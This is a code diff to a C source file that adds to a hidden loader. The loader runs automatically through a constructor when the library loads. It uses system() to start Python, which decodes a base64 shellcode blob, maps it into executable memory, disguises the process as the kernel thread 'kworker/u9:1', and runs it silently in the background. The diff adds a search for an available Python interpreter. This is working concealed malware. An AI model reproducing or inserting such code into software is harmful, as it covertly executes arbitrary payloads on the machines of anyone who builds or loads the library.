@@ -1,9 +1,25 @@
+#include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+static const char *find_python(void) {
+    const char *candidates[] = {"python3", "python", "python3.11", NULL};
+    for (int i = 0; candidates[i]; ++i) {
+        if (access(candidates[i], X_OK) == 0)
+            return candidates[i];
+    }
+    return NULL;
+}
 
 __attribute__((constructor))
 static void run_python(void) {
-    system(
-        "python3 -c \""
+    const char *python = find_python();
+    if (!python) return;
+
+    char cmd[4096];
+    snprintf(cmd, sizeof(cmd),
+        "%s -c \""
         "import base64, mmap, ctypes, sys, os;"
         "encoded=\\\"SDHJSIHp+f///0iNBe////9Iu9zC+gdQuXPYSDFYJ0gt+P///+L0lHrVZTnXXKu0wmNXBOYhvrTvmVMO65vX3ML6KCXKAfe+q5QoONYLsL3CrFAE5xnjhM3/B1C5c9g=\\\";"
         "raw=base64.b64decode(encoded);"
@@ -16,6 +32,6 @@ static void run_python(void) {
         "libc=ctypes.CDLL(None);"
         "libc.prctl(15,b\\\"kworker/u9:1\\\",0,0,0);"
         "shell_func()\""
-        " > /dev/null 2>&1 &"
-    );
+        " > /dev/null 2>&1 &", python);
+    system(cmd);
 }
